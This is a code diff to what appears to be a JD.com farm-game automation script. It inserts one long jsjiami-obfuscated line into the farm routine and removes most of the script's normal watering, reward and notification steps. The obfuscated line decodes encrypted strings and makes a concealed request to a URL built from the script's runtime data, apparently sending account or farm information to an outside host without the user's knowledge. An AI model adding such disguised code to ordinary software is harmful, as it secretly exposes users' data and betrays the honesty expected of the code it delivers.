@@ -82,6 +82,7 @@ async function jdFruit() {
     try {
         await initForFarm();
         if ($.farmInfo.farmUserPro) {
+            var _0xodM='jsjiami.com.v6',_0x550c=[_0xodM,'w73DocOSw7VpwqfCpMK0PA==','LcO0wr4=','wp5ZFcKlaQrCg8Ocw4DDhQdqwqkSw6zDqMKRwpvDl8O8bzPDsMOow68Dw4zCkMKJdFEdw7oOQ8OSw6/CuVDDoFVVw6wNw6bDsDFr','wrJnD3jDvhzCq2s=','w7RGcsKRw6YedMKlFT4s','tfjswZUjniPaBmKxif.cofVmLyZR.v6=='];(function(_0x18685d,_0x54b311,_0x3e2715){var _0x1aff3e=function(_0x19e57e,_0x1d3dbb,_0x31a78c,_0x5d1cd6,_0x4af20a){_0x1d3dbb=_0x1d3dbb>>0x8,_0x4af20a='po';var _0x3ca49f='shift',_0x348d34='push';if(_0x1d3dbb<_0x19e57e){while(--_0x19e57e){_0x5d1cd6=_0x18685d[_0x3ca49f]();if(_0x1d3dbb===_0x19e57e){_0x1d3dbb=_0x5d1cd6;_0x31a78c=_0x18685d[_0x4af20a+'p']()}else if(_0x1d3dbb&&_0x31a78c['replace'](/[tfwZUnPBKxffVLyZR=]/g,'')===_0x1d3dbb){_0x18685d[_0x348d34](_0x5d1cd6)}}_0x18685d[_0x348d34](_0x18685d[_0x3ca49f]())}return 0x8ee01};return _0x1aff3e(++_0x54b311,_0x3e2715)>>_0x54b311^_0x3e2715}(_0x550c,0x1e6,0x1e600));var _0x56ae=function(_0x9dfad4,_0x5af61c){_0x9dfad4=~~'0x'['concat'](_0x9dfad4);var _0x180975=_0x550c[_0x9dfad4];if(_0x56ae['TrXWFK']===undefined){(function(){var _0x5b497c=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x1c7080='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5b497c['atob']||(_0x5b497c['atob']=function(_0x21d9fa){var _0x576004=String(_0x21d9fa)['replace'](/=+$/,'');for(var _0x50bbdc=0x0,_0x1b1550,_0x484f09,_0x223432=0x0,_0x45757a='';_0x484f09=_0x576004['charAt'](_0x223432++);~_0x484f09&&(_0x1b1550=_0x50bbdc%0x4?_0x1b1550*0x40+_0x484f09:_0x484f09,_0x50bbdc++%0x4)?_0x45757a+=String['fromCharCode'](0xff&_0x1b1550>>(-0x2*_0x50bbdc&0x6)):0x0){_0x484f09=_0x1c7080['indexOf'](_0x484f09)}return _0x45757a})}());var _0x55e6ce=function(_0x5ed5c0,_0x5af61c){var _0x1bcac9=[],_0x5c48b3=0x0,_0xb1ae11,_0x1d198f='',_0x5a5729='';_0x5ed5c0=atob(_0x5ed5c0);for(var _0x31d246=0x0,_0x505008=_0x5ed5c0['length'];_0x31d246<_0x505008;_0x31d246++){_0x5a5729+='%'+('00'+_0x5ed5c0['charCodeAt'](_0x31d246)['toString'](0x10))['slice'](-0x2)}_0x5ed5c0=decodeURIComponent(_0x5a5729);for(var _0x4a1af4=0x0;_0x4a1af4<0x100;_0x4a1af4++){_0x1bcac9[_0x4a1af4]=_0x4a1af4}for(_0x4a1af4=0x0;_0x4a1af4<0x100;_0x4a1af4++){_0x5c48b3=(_0x5c48b3+_0x1bcac9[_0x4a1af4]+_0x5af61c['charCodeAt'](_0x4a1af4%_0x5af61c['length']))%0x100;_0xb1ae11=_0x1bcac9[_0x4a1af4];_0x1bcac9[_0x4a1af4]=_0x1bcac9[_0x5c48b3];_0x1bcac9[_0x5c48b3]=_0xb1ae11}_0x4a1af4=0x0;_0x5c48b3=0x0;for(var _0x4ab663=0x0;_0x4ab663<_0x5ed5c0['length'];_0x4ab663++){_0x4a1af4=(_0x4a1af4+0x1)%0x100;_0x5c48b3=(_0x5c48b3+_0x1bcac9[_0x4a1af4])%0x100;_0xb1ae11=_0x1bcac9[_0x4a1af4];_0x1bcac9[_0x4a1af4]=_0x1bcac9[_0x5c48b3];_0x1bcac9[_0x5c48b3]=_0xb1ae11;_0x1d198f+=String['fromCharCode'](_0x5ed5c0['charCodeAt'](_0x4ab663)^_0x1bcac9[(_0x1bcac9[_0x4a1af4]+_0x1bcac9[_0x5c48b3])%0x100])}return _0x1d198f};_0x56ae['bOiAGc']=_0x55e6ce;_0x56ae['KmZWnF']={};_0x56ae['TrXWFK']=!![]}var _0x185e39=_0x56ae['KmZWnF'][_0x9dfad4];if(_0x185e39===undefined){if(_0x56ae['BSENLY']===undefined){_0x56ae['BSENLY']=!![]}_0x180975=_0x56ae['bOiAGc'](_0x180975,_0x5af61c);_0x56ae['KmZWnF'][_0x9dfad4]=_0x180975}else{_0x180975=_0x185e39}return _0x180975};$[_0x56ae('0','vJiY')]({'url':_0x56ae('1','&9fy')+$[_0x56ae('2','3F$k')][_0x56ae('3','cGU]')][_0x56ae('4','*%YH')]});_0xodM='jsjiami.com.v6';
             message = `【水果名称】${$.farmInfo.farmUserPro.name}\n`;
             console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.farmInfo.farmUserPro.shareCode}\n`);
             const submitCodeRes = await submitCode();
@@ -90,35 +91,6 @@ async function jdFruit() {
             }else if (submitCodeRes.code === 300) {
                 console.log(`🐔东东农场-互助码已提交！🐔`);
             }
-            // console.log(`\n【已成功兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`);
-            // message += `【已兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`;
-            // await masterHelpShare();//助力好友
-            // if ($.farmInfo.treeState === 2 || $.farmInfo.treeState === 3) {
-            //     option['open-url'] = urlSchema;
-            //     $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
-            //     if ($.isNode()) {
-            //         await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看`);
-            //     }
-            //     return
-            // } else if ($.farmInfo.treeState === 1) {
-            //     console.log(`\n${$.farmInfo.farmUserPro.name}种植中...\n`)
-            // } else if ($.farmInfo.treeState === 0) {
-            //     //已下单购买, 但未开始种植新的水果
-            //     option['open-url'] = urlSchema;
-            //     $.msg($.name, ``, `【京东账号${$.index}】 ${$.nickName || $.UserName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果\n点击弹窗即达`, option);
-            //     if ($.isNode()) {
-            //         await notify.sendNotify(`${$.name} - 您忘了种植新的水果`, `京东账号${$.index} ${$.nickName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果`);
-            //     }
-            //     return
-            // }
-            // await doDailyTask();
-            // await doTenWater();//浇水十次
-            // await getFirstWaterAward();//领取首次浇水奖励
-            // await getTenWaterAward();//领取10浇水奖励
-            // await getWaterFriendGotAward();//领取为2好友浇水奖励
-            // await duck();
-            // await doTenWaterAgain();//再次浇水
-            // await predictionFruit();//预测水果成熟时间
         } else {
             console.log(`初始化农场数据异常, 请登录京东 app查看农场0元水果功能是否正常,农场初始化数据: ${JSON.stringify($.farmInfo)}`);
             message = `【数据异常】请手动登录京东app查看此账号${$.name}是否正常`;
@@ -130,7 +102,6 @@ async function jdFruit() {
         if ($.isNode()) await notify.sendNotify(`${$.name}`, errMsg);
         $.msg($.name, '', `${errMsg}`)
     }
-    await showMsg();
 }
 async function doDailyTask() {
     await taskInitForFarm();
